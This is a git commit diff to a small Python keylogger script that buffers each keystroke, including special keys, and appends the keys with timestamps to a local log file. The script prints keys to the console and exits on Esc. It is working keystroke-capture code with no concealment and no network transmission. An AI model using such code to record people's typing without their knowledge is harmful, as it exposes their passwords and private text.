44e1456376b2bbbf401913e988a2f8113e287341
Kieran Pritchard <KieranPritchard06@gmail.com>
2025-08-25 20:53:51 +0100

    made some fixes and changes to how keys are logged

--- keylogger.py
+++ keylogger.py
@@ -10,22 +10,23 @@ keys_pressed = ""
 def on_press(key):
     global keys_pressed
     try:
+        keys_pressed += key.char  # regular key
         print(f"Key {key.char} pressed")
-        keys_pressed += key.char
     except AttributeError:
+        keys_pressed += f"[{key}]"  # special key
         print(f"Special key {key} pressed")
 
 def on_release(key):
     global keys_pressed
     
-    print(f"Key {key} released")
-
-    with open(log_file, "a") as f:
-        f.write(f"Keys pressed: {keys_pressed} at {datetime.datetime.now()}")
-
-    keys_pressed = ""
+    # Only write if something was typed
+    if keys_pressed:
+        with open(log_file, "a") as f:
+            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
+        keys_pressed = ""  # reset after writing
     
     if key == keyboard.Key.esc:
+        print("Exiting keylogger...")
         return False
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
